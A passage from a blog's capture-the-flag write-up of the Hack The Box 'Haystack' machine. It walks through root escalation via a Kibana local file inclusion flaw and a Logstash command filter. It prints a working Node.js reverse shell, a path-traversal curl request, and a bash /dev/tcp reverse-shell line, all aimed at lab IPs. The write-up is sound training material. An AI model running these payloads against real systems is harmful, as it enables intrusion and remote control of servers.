&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;net&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;child_process&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;spawn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/bin/sh&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10.10.14.19&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/a/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Prevents the Node.js application form crashing&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;})();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We place the shell code into a directory to which we have access as the &lt;code class=&quot;highlighter-rouge&quot;&gt;security&lt;/code&gt; user. In this case we place the shell into &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/shm&lt;/code&gt;, and name it &lt;code class=&quot;highlighter-rouge&quot;&gt;mahshell.js&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We are able to determine that &lt;code class=&quot;highlighter-rouge&quot;&gt;kibana&lt;/code&gt; is running locally on port &lt;code class=&quot;highlighter-rouge&quot;&gt;5601&lt;/code&gt; by reading the &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/kibana/kibana.yml&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/08/haystack/kibana_yml.png&quot; alt=&quot;kibana yml&quot; /&gt;
&lt;strong&gt;Figure 3:&lt;/strong&gt; kibana.yml&lt;/p&gt;

&lt;p&gt;We can make the following &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt; request to execute our reverse shell code.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;[security@haystack shm]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;amp;apis=../../../../../../../../../../../dev/shm/mahshell.js&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;kbn-xsrf: true&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/08/haystack/kibana_user.png&quot; alt=&quot;kibana user&quot; /&gt;
&lt;strong&gt;Figure 4&lt;/strong&gt;: Shell as kibana user.&lt;/p&gt;

&lt;p&gt;Now that we are the user &lt;code class=&quot;highlighter-rouge&quot;&gt;kibana&lt;/code&gt;, we go back to the configuration files under &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/logstash/conf.d&lt;/code&gt; and check out what &lt;code class=&quot;highlighter-rouge&quot;&gt;filter.conf&lt;/code&gt; contains.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;bash-4.2$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /etc/logstash/conf.d
&lt;span class=&quot;go&quot;&gt;cd /etc/logstash/conf.d
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;bash-4.2$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;ls -la
total 12
drwxrwxr-x. 2 root kibana  62 jun 24 08:12 .
drwxr-xr-x. 3 root root   183 jun 18 22:15 ..
-rw-r-----. 1 root kibana 131 jun 20 10:59 filter.conf
-rw-r-----. 1 root kibana 186 jun 24 08:12 input.conf
-rw-r-----. 1 root kibana 109 jun 24 08:12 output.conf
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;bash-4.2$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;filter.conf
&lt;span class=&quot;go&quot;&gt;cat filter.conf
filter {
	if [type] == &quot;execute&quot; {
		grok {
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;			match =&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;message&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Ejecutar&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;*comando&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;*:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+%{GREEDYDATA:comando}&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;		}
	}
}
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This filter allows us to execute commands with the proper input. By placing our own &lt;code class=&quot;highlighter-rouge&quot;&gt;logstash_x&lt;/code&gt; file into the &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/kibana&lt;/code&gt; directory, we should get command execution.&lt;/p&gt;

&lt;p&gt;Our logstash file follows exactly as &lt;code class=&quot;highlighter-rouge&quot;&gt;filter.conf&lt;/code&gt; defines. Small note, our IP address has changed due to reconnecting to the Hack The Box VPN the following day.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Ejecutar comando : bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.201/6666  0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After waiting a few seconds, the command to call our reverse shell is executed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/08/haystack/rooted.png&quot; alt=&quot;Rooted&quot; /&gt;
&lt;strong&gt;Figure: 5&lt;/strong&gt; Rooted&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;[root@haystack /]#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
&lt;span class=&quot;go&quot;&gt;cat /root/root.txt
3f5f727c38d9f70e1d2ad2ba11059d92
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;The user flag portion of this box was very CTF like. There’s not much chance that in the real world you’re going to come across a situation where clues are hidden in a &lt;code class=&quot;highlighter-rouge&quot;&gt;.jpg&lt;/code&gt; and then &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; encoded credentials are hidden in a database that contains a large amount of arbitrary data. I did learn from this experience though. This was the first time I’ve had to find a string hidden in an image, and it was my first experience with Elasticsearch queries.&lt;/p&gt;

&lt;p&gt;The root portion of this box was rather difficult for me with my lack of experience in the ELK stack. It didn’t take long to find the local file inclusion vulnerability, but leveraging it to get root really required me to research how &lt;code class=&quot;highlighter-rouge&quot;&gt;logstash&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;kibana&lt;/code&gt; work. All in all I’m pleased to have completed the box.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.socketloop.com/tutorials/elastic-search-return-all-records-higher-than-default-10&quot;&gt;https://www.socketloop.com/tutorials/elastic-search-return-all-records-higher-than-default-10&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://superuser.com/questions/803225/how-to-find-detect-hidden-files-inside-jpeg-file&quot;&gt;https://superuser.com/questions/803225/how-to-find-detect-hidden-files-inside-jpeg-file&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/mpgn/CVE-2018-17246&quot;&gt;https://github.com/mpgn/CVE-2018-17246&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/&quot;&gt;https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/168291&quot;&gt;https://www.anquanke.com/post/id/168291&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://grokdebug.herokuapp.com/&quot;&gt;https://grokdebug.herokuapp.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="Privilege Escalation" /><category term="PHP" /><category term="Elasticsearch" /><category term="ELK" /><summary type="html"></summary></entry></feed>